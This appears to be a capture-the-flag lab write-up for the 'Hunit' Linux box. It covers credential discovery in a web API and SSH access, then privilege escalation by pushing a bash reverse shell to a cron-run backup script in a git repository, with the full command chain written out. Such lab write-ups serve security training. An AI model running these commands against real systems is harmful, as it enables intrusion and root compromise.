# 🚦 Hunit (Linux)

> **Vector:** WebApp, Git  
> [Walkthrough Link](https://medium.com/@bdsalazar/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d)  
> _Difficulty: Intermediate_  
---

### 🔎 Enumeration & Initial Foothold

- Port **8080** was open, presenting a site titled "**The Taste of Rain**" 🌧️.  
- Viewing the source of the main page revealed a hidden `/api/` endpoint, and under `/api/user/` we discovered several hardcoded credentials directly on the page.  
- Used those credentials to successfully SSH into the machine.

---

### 🧑‍💻 Privilege Escalation

- Once inside, ran `linpeas.sh` and identified interesting cron jobs and a sensitive `git_id_rsa` private key.
- According to the walkthrough's _Lateral Movement_ chapter, we exploited Git with SSH:

```bash
GIT_SSH_COMMAND='ssh -i git_id_rsa -p 43022' git clone git@192.168.179.125:/git-server
echo "/bin/bash -i >& /dev/tcp/192.168.45.166/8080 0>&1" >> backups.sh
chmod +x backups.sh
git config --global user.name "kali"
git config --global user.email "kali@kali.(none)"
git add -A
git commit -m "pwn"
GIT_SSH_COMMAND='ssh -i /home/kali/LinuxMachines/Hunit/git_id_rsa -p 43022' git push origin master
nc -nlvp 8080
```

- After pushing the malicious backup script, within about 3 minutes a reverse shell was received as root 🚀.

---

**Key Takeaways:**  
- 🕵️ Always review API endpoints and hidden pages for sensitive info.  
- 🗝️ Exploiting exposed git credentials and cron jobs can yield root access.  
- ⏰ Git hooks and cron jobs are prime escalation vectors on Linux boxes.

---

**Security Note:**  
> Never expose sensitive credentials or SSH keys in web application APIs, and restrict SSH & Git service ports in production.